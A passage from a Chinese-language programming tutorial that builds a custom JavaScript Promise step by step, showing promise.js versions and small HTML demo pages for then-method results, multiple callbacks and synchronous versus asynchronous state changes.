&#125;);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;!DOCTYPE <span class="keyword">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">html</span> <span class="attr">lang</span>=<span class="string">&quot;en&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">meta</span> <span class="attr">charset</span>=<span class="string">&quot;UTF-8&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">meta</span> <span class="attr">name</span>=<span class="string">&quot;viewport&quot;</span> <span class="attr">content</span>=<span class="string">&quot;width=device-width, initial-scale=1.0&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">title</span>&gt;</span>Promise-封装 | 8 - 指定多个回调 <span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">script</span> <span class="attr">src</span>=<span class="string">&quot;./promise.js&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript">    <span class="comment">//实例化对象</span></span></span><br><span class="line"><span class="language-javascript">    <span class="keyword">let</span> p = <span class="keyword">new</span> <span class="title class_">Promise</span>(<span class="function">(<span class="params">resolve, reject</span>) =&gt;</span> &#123;</span></span><br><span class="line"><span class="language-javascript">        <span class="built_in">setTimeout</span>(<span class="function">() =&gt;</span> &#123;</span></span><br><span class="line"><span class="language-javascript">            <span class="comment">// resolve(&#x27;OK&#x27;);</span></span></span><br><span class="line"><span class="language-javascript">            <span class="title function_">reject</span>(<span class="string">&#x27;No&#x27;</span>);</span></span><br><span class="line"><span class="language-javascript">        &#125;, <span class="number">1000</span>);</span></span><br><span class="line"><span class="language-javascript">    &#125;);</span></span><br><span class="line"><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript">    p.<span class="title function_">then</span>(<span class="function"><span class="params">value</span> =&gt;</span> &#123;</span></span><br><span class="line"><span class="language-javascript">        <span class="variable language_">console</span>.<span class="title function_">log</span>(value);</span></span><br><span class="line"><span class="language-javascript">    &#125;, <span class="function"><span class="params">reason</span>=&gt;</span>&#123;</span></span><br><span class="line"><span class="language-javascript">        <span class="variable language_">console</span>.<span class="title function_">warn</span>(reason);</span></span><br><span class="line"><span class="language-javascript">    &#125;);</span></span><br><span class="line"><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript">    p.<span class="title function_">then</span>(<span class="function"><span class="params">value</span> =&gt;</span> &#123;</span></span><br><span class="line"><span class="language-javascript">        <span class="title function_">alert</span>(value);</span></span><br><span class="line"><span class="language-javascript">    &#125;, <span class="function"><span class="params">reason</span>=&gt;</span>&#123;</span></span><br><span class="line"><span class="language-javascript">        <span class="title function_">alert</span>(reason);</span></span><br><span class="line"><span class="language-javascript">    &#125;);</span></span><br><span class="line"><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript">    <span class="variable language_">console</span>.<span class="title function_">log</span>(p);</span></span><br><span class="line"><span class="language-javascript"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure><h2 id="同步修改状态then方法返回结果"><a href="#同步修改状态then方法返回结果" class="headerlink" title="同步修改状态then方法返回结果"></a>同步修改状态then方法返回结果</h2><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="comment">/**** promise.js文件 *****/</span></span><br><span class="line"><span class="comment">//声明构造函数</span></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">Promise</span>(<span class="params">executor</span>)&#123;</span><br><span class="line">    <span class="comment">//添加属性</span></span><br><span class="line">    <span class="variable language_">this</span>.<span class="property">PromiseState</span> = <span class="string">&#x27;pending&#x27;</span>;</span><br><span class="line">    <span class="variable language_">this</span>.<span class="property">PromiseResult</span> = <span class="literal">null</span>;</span><br><span class="line">    <span class="comment">//声明属性</span></span><br><span class="line">    <span class="variable language_">this</span>.<span class="property">callbacks</span> = [];</span><br><span class="line">    <span class="comment">//保存实例对象的 this 的值</span></span><br><span class="line">    <span class="keyword">const</span> self = <span class="variable language_">this</span>;<span class="comment">// self _this that</span></span><br><span class="line">    <span class="comment">//resolve 函数</span></span><br><span class="line">    <span class="keyword">function</span> <span class="title function_">resolve</span>(<span class="params">data</span>)&#123;</span><br><span class="line">        <span class="comment">//判断状态</span></span><br><span class="line">        <span class="keyword">if</span>(self.<span class="property">PromiseState</span> !== <span class="string">&#x27;pending&#x27;</span>) <span class="keyword">return</span>;</span><br><span class="line">        <span class="comment">//1. 修改对象的状态 (promiseState)</span></span><br><span class="line">        self.<span class="property">PromiseState</span> = <span class="string">&#x27;fulfilled&#x27;</span>;<span class="comment">// resolved</span></span><br><span class="line">        <span class="comment">//2. 设置对象结果值 (promiseResult)</span></span><br><span class="line">        self.<span class="property">PromiseResult</span> = data;</span><br><span class="line">        <span class="comment">//调用成功的回调函数</span></span><br><span class="line">        self.<span class="property">callbacks</span>.<span class="title function_">forEach</span>(<span class="function"><span class="params">item</span> =&gt;</span> &#123;</span><br><span class="line">            item.<span class="title function_">onResolved</span>(data);</span><br><span class="line">        &#125;);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">//reject 函数</span></span><br><span class="line">    <span class="keyword">function</span> <span class="title function_">reject</span>(<span class="params">data</span>)&#123;</span><br><span class="line">        <span class="comment">//判断状态</span></span><br><span class="line">        <span class="keyword">if</span>(self.<span class="property">PromiseState</span> !== <span class="string">&#x27;pending&#x27;</span>) <span class="keyword">return</span>;</span><br><span class="line">        <span class="comment">//1. 修改对象的状态 (promiseState)</span></span><br><span class="line">        self.<span class="property">PromiseState</span> = <span class="string">&#x27;rejected&#x27;</span>;<span class="comment">// </span></span><br><span class="line">        <span class="comment">//2. 设置对象结果值 (promiseResult)</span></span><br><span class="line">        self.<span class="property">PromiseResult</span> = data;</span><br><span class="line">        <span class="comment">//执行失败的回调</span></span><br><span class="line">        self.<span class="property">callbacks</span>.<span class="title function_">forEach</span>(<span class="function"><span class="params">item</span> =&gt;</span> &#123;</span><br><span class="line">            item.<span class="title function_">onRejected</span>(data);</span><br><span class="line">        &#125;);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">try</span>&#123;</span><br><span class="line">        <span class="comment">//同步调用『执行器函数』</span></span><br><span class="line">        <span class="title function_">executor</span>(resolve, reject);</span><br><span class="line">    &#125;<span class="keyword">catch</span>(e)&#123;</span><br><span class="line">        <span class="comment">//修改 promise 对象状态为『失败』</span></span><br><span class="line">        <span class="title function_">reject</span>(e);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//添加 then 方法</span></span><br><span class="line"><span class="title class_">Promise</span>.<span class="property"><span class="keyword">prototype</span></span>.<span class="property">then</span> = <span class="keyword">function</span>(<span class="params">onResolved, onRejected</span>)&#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="keyword">new</span> <span class="title class_">Promise</span>(<span class="function">(<span class="params">resolve, reject</span>) =&gt;</span> &#123;</span><br><span class="line">        <span class="comment">//调用回调函数  PromiseState</span></span><br><span class="line">        <span class="keyword">if</span>(<span class="variable language_">this</span>.<span class="property">PromiseState</span> === <span class="string">&#x27;fulfilled&#x27;</span>)&#123;</span><br><span class="line">            <span class="keyword">try</span>&#123;</span><br><span class="line">                <span class="comment">//获取回调函数的执行结果</span></span><br><span class="line">                <span class="keyword">let</span> result = <span class="title function_">onResolved</span>(<span class="variable language_">this</span>.<span class="property">PromiseResult</span>);</span><br><span class="line">                <span class="comment">//判断</span></span><br><span class="line">                <span class="keyword">if</span>(result <span class="keyword">instanceof</span> <span class="title class_">Promise</span>)&#123;</span><br><span class="line">                    <span class="comment">//如果是 Promise 类型的对象</span></span><br><span class="line">                    result.<span class="title function_">then</span>(<span class="function"><span class="params">v</span> =&gt;</span> &#123;</span><br><span class="line">                        <span class="title function_">resolve</span>(v);</span><br><span class="line">                    &#125;, <span class="function"><span class="params">r</span>=&gt;</span>&#123;</span><br><span class="line">                        <span class="title function_">reject</span>(r);</span><br><span class="line">                    &#125;)</span><br><span class="line">                &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">                    <span class="comment">//结果的对象状态为『成功』</span></span><br><span class="line">                    <span class="title function_">resolve</span>(result);</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;<span class="keyword">catch</span>(e)&#123;</span><br><span class="line">                <span class="title function_">reject</span>(e);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span>(<span class="variable language_">this</span>.<span class="property">PromiseState</span> === <span class="string">&#x27;rejected&#x27;</span>)&#123;</span><br><span class="line">            <span class="title function_">onRejected</span>(<span class="variable language_">this</span>.<span class="property">PromiseResult</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment">//判断 pending 状态</span></span><br><span class="line">        <span class="keyword">if</span>(<span class="variable language_">this</span>.<span class="property">PromiseState</span> === <span class="string">&#x27;pending&#x27;</span>)&#123;</span><br><span class="line">            <span class="comment">//保存回调函数</span></span><br><span class="line">            <span class="variable language_">this</span>.<span class="property">callbacks</span>.<span class="title function_">push</span>(&#123;</span><br><span class="line">                <span class="attr">onResolved</span>: onResolved,</span><br><span class="line">                <span class="attr">onRejected</span>: onRejected</span><br><span class="line">            &#125;);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;)</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;!DOCTYPE <span class="keyword">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">html</span> <span class="attr">lang</span>=<span class="string">&quot;en&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">meta</span> <span class="attr">charset</span>=<span class="string">&quot;UTF-8&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">meta</span> <span class="attr">name</span>=<span class="string">&quot;viewport&quot;</span> <span class="attr">content</span>=<span class="string">&quot;width=device-width, initial-scale=1.0&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">title</span>&gt;</span>Promise-封装 | 9 - 同步任务 then 返回结果<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">script</span> <span class="attr">src</span>=<span class="string">&quot;./promise.js&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript">    <span class="comment">//实例化对象</span></span></span><br><span class="line"><span class="language-javascript">    <span class="keyword">let</span> p = <span class="keyword">new</span> <span class="title class_">Promise</span>(<span class="function">(<span class="params">resolve, reject</span>) =&gt;</span> &#123;</span></span><br><span class="line"><span class="language-javascript">        <span class="title function_">resolve</span>(<span class="string">&#x27;OK&#x27;</span>);</span></span><br><span class="line"><span class="language-javascript">    &#125;);</span></span><br><span class="line"><span class="language-javascript">    <span class="comment">//执行 then 方法</span></span></span><br><span class="line"><span class="language-javascript">    <span class="keyword">const</span> res = p.<span class="title function_">then</span>(<span class="function"><span class="params">value</span> =&gt;</span> &#123;</span></span><br><span class="line"><span class="language-javascript">        <span class="comment">// return &#x27;hello promise&#x27;</span></span></span><br><span class="line"><span class="language-javascript">        <span class="comment">/*return new Promise((resolve, reject) =&gt; &#123;</span></span></span><br><span class="line"><span class="comment"><span class="language-javascript">            resolve(&#x27;success&#x27;)</span></span></span><br><span class="line"><span class="comment"><span class="language-javascript">            reject(&#x27;oh, no&#x27;)</span></span></span><br><span class="line"><span class="comment"><span class="language-javascript">        &#125;)*/</span></span></span><br><span class="line"><span class="language-javascript">        <span class="comment">//抛出异常</span></span></span><br><span class="line"><span class="language-javascript">        <span class="keyword">throw</span> <span class="string">&quot;FAIL&quot;</span>;</span></span><br><span class="line"><span class="language-javascript">    &#125;, <span class="function"><span class="params">reason</span>=&gt;</span>&#123;</span></span><br><span class="line"><span class="language-javascript">        <span class="variable language_">console</span>.<span class="title function_">warn</span>(reason);</span></span><br><span class="line"><span class="language-javascript">    &#125;);</span></span><br><span class="line"><span class="language-javascript">    <span class="variable language_">console</span>.<span class="title function_">log</span>(res);</span></span><br><span class="line"><span class="language-javascript"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure><h2 id="异步修改状态then方法返回结果"><a href="#异步修改状态then方法返回结果" class="headerlink" title="异步修改状态then方法返回结果"></a>异步修改状态then方法返回结果</h2><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="comment">/**** promise.js文件 *****/</span></span><br><span class="line"><span class="comment">//声明构造函数</span></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">Promise</span>(<span class="params">executor</span>)&#123;</span><br><span class="line">    <span class="comment">//添加属性</span></span><br><span class="line">    <span class="variable language_">this</span>.<span class="property">PromiseState</span> = <span class="string">&#x27;pending&#x27;</span>;</span><br><span class="line">    <span class="variable language_">this</span>.<span class="property">PromiseResult</span> = <span class="literal">null</span>;</span><br><span class="line">    <span class="comment">//声明属性</span></span><br><span class="line">    <span class="variable language_">this</span>.<span class="property">callbacks</span> = [];</span><br><span class="line">    <span class="comment">//保存实例对象的 this 的值</span></span><br><span class="line">    <span class="keyword">const</span> self = <span class="variable language_">this</span>;<span class="comment">// self _this that</span></span><br><span class="line">    <span class="comment">//resolve 函数</span></span><br><span class="line">    <span class="keyword">function</span> <span class="title function_">resolve</span>(<span class="params">data</span>)&#123;</span><br><span class="line">        <span class="comment">//判断状态</span></span><br><span class="line">        <span class="keyword">if</span>(self.<span class="property">PromiseState</span> !== <span class="string">&#x27;pending&#x27;</span>) <span class="keyword">return</span>;</span><br><span class="line">        <span class="comment">//1. 修改对象的状态 (promiseState)</span></span><br><span class="line">        self.<span class="property">PromiseState</span> = <span class="string">&#x27;fulfilled&#x27;</span>;<span class="comment">// resolved</span></span><br><span class="line">        <span class="comment">//2. 设置对象结果值 (promiseResult)</span></span><br><span class="line">        self.<span class="property">PromiseResult</span> = data;</span><br><span class="line">        <span class="comment">//调用成功的回调函数</span></span><br><span class="line">        self.<span class="property">callbacks</span>.<span class="title function_">forEach</span>(<span class="function"><span class="params">item</span> =&gt;</span> &#123;</span><br><span class="line">            item.<span class="title function_">onResolved</span>(data);</span><br><span class="line">        &#125;);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">//reject 函数</span></span><br><span class="line">    <span class="keyword">function</span> <span class="title function_">reject</span>(<span class="params">data</span>)&#123;</span><br><span class="line">        <span class="comment">//判断状态</span></span><br><span class="line">        <span class="keyword">if</span>(self.<span class="property">PromiseState</span> !== <span class="string">&#x27;pending&#x27;</span>) <span class="keyword">return</span>;</span><br><span class="line">        <span class="comment">//1. 修改对象的状态 (promiseState)</span></span><br><span class="line">        self.<span class="property">PromiseState</span> = <span class="string">&#x27;rejected&#x27;</span>;<span class="comment">// </span></span><br><span class="line">        <span class="comment">//2. 设置对象结果值 (promiseResult)</span></span><br><span class="line">        self.<span class="property">PromiseResult</span> = data;</span><br><span class="line">        <span class="comment">//执行失败的回调</span></span><br><span class="line">        self.<span class="property">callbacks</span>.<span class="title function_">forEach</span>(<span class="function"><span class="params">item</span> =&gt;</span> &#123;</span><br><span class="line">            item.<span class="title function_">onRejected</span>(data);</span><br><span class="line">        &#125;);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">try</span>&#123;</span><br><span class="line">        <span class="comment">//同步调用『执行器函数』</span></span><br><span class="line">        <span class="title function_">executor</span>(resolve, reject);</span><br><span class="line">    &#125;<span class="keyword">catch</span>(e)&#123;</span><br><span class="line">        <span class="comment">//修改 promise 对象状态为『失败』</span></span><br><span class="line">        <span class="title function_">reject</span>(e);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//添加 then 方法</span></span><br><span class="line"><span class="title class_">Promise</span>.<span class="property"><span class="keyword">prototype</span></span>.<span class="property">then</span> = <span class="keyword">function</span>(<span class="params">onResolved, onRejected</span>)&#123;</span><br><span class="line">    <span class="keyword">const</span> self = <span class="variable language_">this</span>;</span><br><span class="line">    <span class="keyword">return</span> <span class="keyword">new</span> <span class="title class_">Promise</span>(<span class="function">(<span class="params">resolve, reject</span>) =&gt;</span> &#123;</span><br><span class="line">        <span class="comment">//调用回调函数  PromiseState</span></span><br><span class="line">        <span class="keyword">if</span>(<span class="variable language_">this</span>.<span class="property">PromiseState</span> === <span class="string">&#x27;fulfilled&#x27;</span>)&#123;</span><br><span class="line">            <span class="keyword">try</span>&#123;</span><br><span class="line">                <span class="comment">//获取回调函数的执行结果</span></span><br><span class="line">                <span class="keyword">let</span> result = <span class="title function_">onResolved</span>(<span class="variable language_">this</span>.<span class="property">PromiseResult</span>);</span><br><span class="line">                <span class="comment">//判断</span></span><br><span class="line">                <span class="keyword">if</span>(result <span class="keyword">instanceof</span> <span class="title class_">Promise</span>)&#123;</span><br><span class="line">                    <span class="comment">//如果是 Promise 类型的对象</span></span><br><span class="line">                    result.<span class="title function_">then</span>(<span class="function"><span class="params">v</span> =&gt;</span> &#123;</span><br><span class="line">                        <span class="title function_">resolve</span>(v);</span><br><span class="line">                    &#125;, <span class="function"><span class="params">r</span>=&gt;</span>&#123;</span><br><span class="line">                        <span class="title function_">reject</span>(r);</span><br><span class="line">                    &#125;)</span><br><span class="line">                &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">                    <span class="comment">//结果的对象状态为『成功』</span></span><br><span class="line">                    <span class="title function_">resolve</span>(result);</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;<span class="keyword">catch</span>(e)&#123;</span><br><span class="line">                <span class="title function_">reject</span>(e);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span>(<span class="variable language_">this</span>.<span class="property">PromiseState</span> === <span class="string">&#x27;rejected&#x27;</span>)&#123;</span><br><span class="line">            <span class="title function_">onRejected</span>(<span class="variable language_">this</span>.<span class="property">PromiseResult</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment">//判断 pending 状态</span></span><br><span class="line">        <span class="keyword">if</span>(<span class="variable language_">this</span>.<span class="property">PromiseState</span> === <span class="string">&#x27;pending&#x27;</span>)&#123;</span><br><span class="line">            <span class="comment">//保存回调函数</span></span><br><span class="line">            <span class="variable language_">this</span>.<span class="property">callbacks</span>.<span class="title function_">push</span>(&#123;</span><br><span class="line">                <span class="attr">onResolved</span>: <span class="keyword">function</span>(<span class="params"></span>)&#123;</span><br><span class="line">                    <span class="keyword">try</span>&#123;</span><br><span class="line">                        <span class="comment">//执行成功回调函数</span></span><br><span class="line">                        <span class="keyword">let</span> result = <span class="title function_">onResolved</span>(self.<span class="property">PromiseResult</span>);</span><br><span class="line">                        <span class="comment">//判断</span></span><br><span class="line">                        <span class="keyword">if</span>(result <span class="keyword">instanceof</span> <span class="title class_">Promise</span>)&#123;</span><br><span class="line">                            result.<span class="title function_">then</span>(<span class="function"><span class="params">v</span> =&gt;</span> &#123;</span><br><span class="line">                                <span class="title function_">resolve</span>(v);</span><br><span class="line">                            &#125;, <span class="function"><span class="params">r</span>=&gt;</span>&#123;</span><br><span class="line">                                <span class="title function_">reject</span>(r);</span><br><span class="line">                            &#125;)</span><br><span class="line">                        &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">                            <span class="title function_">resolve</span>(result);</span><br><span class="line">                        &#125;</span><br><span class="line">                    &#125;<span class="keyword">catch</span>(e)&#123;</span><br><span class="line">                        <span class="title function_">reject</span>(e);</span><br><span class="line">                    &#125;</span><br><span class="line">                &#125;,</span><br><span class="line">                <span class="attr">onRejected</span>: <span class="keyword">function</span>(<span class="params"></span>)&#123;</span><br><span class="line">                    <span class="keyword">try</span>&#123;</span><br><span class="line">                        <span class="comment">//执行成功回调函数</span></span><br><span class="line">                        <span class="keyword">let</span> result = <span class="title function_">onRejected</span>(self.<span class="property">PromiseResult</span>);</span><br><span class="line">                        <span class="comment">//判断</span></span><br><span class="line">                        <span class="keyword">if</span>(result <span class="keyword">instanceof</span> <span class="title class_">Promise</span>)&#123;</span><br><span class="line">                            result.<span class="title function_">then</span>(<span class="function"><span class="params">v</span> =&gt;</span> &#123;</span><br><span class="line">                                <span class="title function_">resolve</span>(v);</span><br><span class="line">                            &#125;, <span class="function"><span class="params">r</span>=&gt;</span>&#123;</span><br><span class="line">                                <span class="title function_">reject</span>(r);</span><br><span class="line">                            &#125;)</span><br><span class="line">                        &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">                            <span class="title function_">resolve</span>(result);</span><br><span class="line">                        &#125;</span><br><span class="line">                    &#125;<span class="keyword">catch</span>(e)&#123;</span><br><span class="line">                        <span class="title function_">reject</span>(e);</span><br><span class="line">                    &#125;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;)</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;!DOCTYPE <span class="keyword">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">html</span> <span class="attr">lang</span>=<span class="string">&quot;en&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">meta</span> <span class="attr">charset</span>=<span class="string">&quot;UTF-8&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">meta</span> <span class="attr">name</span>=<span class="string">&quot;viewport&quot;</span> <span class="attr">content</span>=<span class="string">&quot;width=device-width, initial-scale=1.0&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">title</span>&gt;</span>Promise-封装 | 10 - 异步任务 then 返回结果<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">script</span> <span class="attr">src</span>=<span class="string">&quot;./promise.js&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript">        <span class="comment">//实例化对象</span></span></span><br><span class="line"><span class="language-javascript">        <span class="keyword">let</span> p = <span class="keyword">new</span> <span class="title class_">Promise</span>(<span class="function">(<span class="params">resolve, reject</span>) =&gt;</span> &#123;</span></span><br><span class="line"><span class="language-javascript">            <span class="built_in">setTimeout</span>(<span class="function">() =&gt;</span> &#123;</span></span><br><span class="line"><span class="language-javascript">                <span class="comment">// resolve(&#x27;OK&#x27;);</span></span></span><br><span class="line"><span class="language-javascript">                <span class="title function_">reject</span>(<span class="string">&quot;Error&quot;</span>);</span></span><br><span class="line"><span class="language-javascript">            &#125;, <span class="number">1000</span>)</span></span><br><span class="line"><span class="language-javascript">        &#125;);</span></span><br><span class="line"><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript">        <span class="comment">//执行 then 方法</span></span></span><br><span class="line"><span class="language-javascript">        <span class="keyword">const</span> res = p.<span class="title function_">then</span>(<span class="function"><span class="params">value</span> =&gt;</span> &#123;</span></span><br><span class="line"><span class="language-javascript">            <span class="comment">// return &#x27;oh Yeah&#x27;;</span></span></span><br><span class="line"><span class="language-javascript">            <span class="keyword">throw</span> <span class="string">&#x27;error&#x27;</span>;</span></span><br><span class="line"><span class="language-javascript">        &#125;, <span class="function"><span class="params">reason</span>=&gt;</span>&#123;</span></span><br><span class="line"><span class="language-javascript">            <span class="comment">// console.warn(reason);</span></span></span><br><span class="line"><span class="language-javascript">            <span class="keyword">throw</span> <span class="string">&#x27;error&#x27;</span>;</span></span><br><span class="line"><span class="language-javascript">        &#125;);</span></span><br><span class="line"><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript">        <span class="variable language_">console</span>.<span class="title function_">log</span>(res);</span></span><br><span class="line"><span class="language-javascript">    </span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure><h2 id="then方法代码优化"><a href="#then方法代码优化" class="headerlink" title="then方法代码优化"></a>then方法代码优化</h2><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="comment">//声明构造函数</span></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">Promise</span>(<span class="params">executor</span>)&#123;</span><br><span class="line">    <span class="comment">//添加属性</span></span><br><span class="line">    <span class="variable language_">this</span>.<span class="property">PromiseState</span> = <span class="string">&#x27;pending&#x27;</span>;</span><br><span class="line">    <span class="variable language_">this</span>.<span class="property">PromiseResult</span> = <span class="literal">null</span>;</span><br><span class="line">    <span class="comment">//声明属性</span></span><br><span class="line">    <span class="variable language_">this</span>.<span class="property">callbacks</span> = [];</span><br><span class="line">    <span class="comment">//保存实例对象的 this 的值</span></span><br><span class="line">    <span class="keyword">const</span> self = <span class="variable language_">this</span>;<span class="comment">// self _this that</span></span><br><span class="line">    <span class="comment">//resolve 函数</span></span><br><span class="line">    <span class="keyword">function</span> <span class="title function_">resolve</span>(<span class="params">data</span>)&#123;</span><br><span class="line">        <span class="comment">//判断状态</span></span><br><span class="line">        <span class="keyword">if</span>(self.<span class="property">PromiseState</span> !== <span class="string">&#x27;pending&#x27;</span>) <span class="keyword">return</span>;</span><br><span class="line">        <span class="comment">//1. 修改对象的状态 (promiseState)</span></span><br><span class="line">        self.<span class="property">PromiseState</span> = <span class="string">&#x27;fulfilled&#x27;</span>;<span class="comment">// resolved</span></span><br><span class="line">        <span class="comment">//2. 设置对象结果值 (promiseResult)</span></span><br><span class="line">        self.<span class="property">PromiseResult</span> = data;</span><br><span class="line">        <span class="comment">//调用成功的回调函数</span></span><br><span class="line">        self.<span class="property">callbacks</span>.<span class="title function_">forEach</span>(<span class="function"><span class="params">item</span> =&gt;</span> &#123;</span><br><span class="line">            item.<span class="title function_">onResolved</span>(data);</span><br><span class="line">        &#125;);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">//reject 函数</span></span><br><span class="line">    <span class="keyword">function</span> <span class="title function_">reject</span>(<span class="params">data</span>)&#123;</span><br><span class="line">        <span class="comment">//判断状态</span></span><br><span class="line">        <span class="keyword">if</span>(self.<span class="property">PromiseState</span> !== <span class="string">&#x27;pending&#x27;</span>) <span class="keyword">return</span>;</span><br><span class="line">        <span class="comment">//1. 修改对象的状态 (promiseState)</span></span><br><span class="line">        self.<span class="property">PromiseState</span> = <span class="string">&#x27;rejected&#x27;</span>;<span class="comment">// </span></span><br><span class="line">        <span class="comment">//2. 设置对象结果值 (promiseResult)</span></span><br><span class="line">        self.<span class="property">PromiseResult</span> = data;</span><br><span class="line">        <span class="comment">//执行失败的回调</span></span><br><span class="line">        self.<span class="property">callbacks</span>.<span class="title function_">forEach</span>(<span class="function"><span class="params">item</span> =&gt;</span> &#123;</span><br><span class="line">            item.<span class="title function_">onRejected</span>(data);</span><br><span class="line">        &#125;);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">try</span>&#123;</span><br><span class="line">        <span class="comment">//同步调用『执行器函数』</span></span><br><span class="line">        <span class="title function_">executor</span>(resolve, reject);</span><br><span class="line">    &#125;<span class="keyword">catch</span>(e)&#123;</span><br><span class="line">        <span class="comment">//修改 promise 对象状态为『失败』</span></span><br><span class="line">        <span class="title function_">reject</span>(e);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//添加 then 方法</span></span><br><span class="line"><span class="title class_">Promise</span>.<span class="property"><span class="keyword">prototype</span></span>.<span class="property">then</span> = <span class="keyword">function</span>(<span class="params">onResolved, onRejected</span>)&#123;</span><br><span class="line">    <span class="keyword">const</span> self = <span class="variable language_">this</span>;</span><br><span class="line">    <span class="keyword">return</span> <span class="keyword">new</span> <span class="title class_">Promise</span>(<span class="function">(<span class="params">resolve, reject</span>) =&gt;</span> &#123;</span><br><span class="line">        <span class="comment">//封装函数</span></span><br><span class="line">        <span class="keyword">function</span> <span class="title function_">callback</span>(<span class="params">type</span>)&#123;</span><br><span class="line">            <span class="keyword">try</span>&#123;</span><br><span class="line">                <span class="comment">//获取回调函数的执行结果</span></span><br><span class="line">                <span class="keyword">let</span> result = <span class="title function_">type</span>(self.<span class="property">PromiseResult</span>);</span><br><span class="line">                <span class="comment">//判断</span></span><br><span class="line">                <span class="keyword">if</span>(result <span class="keyword">instanceof</span> <span class="title 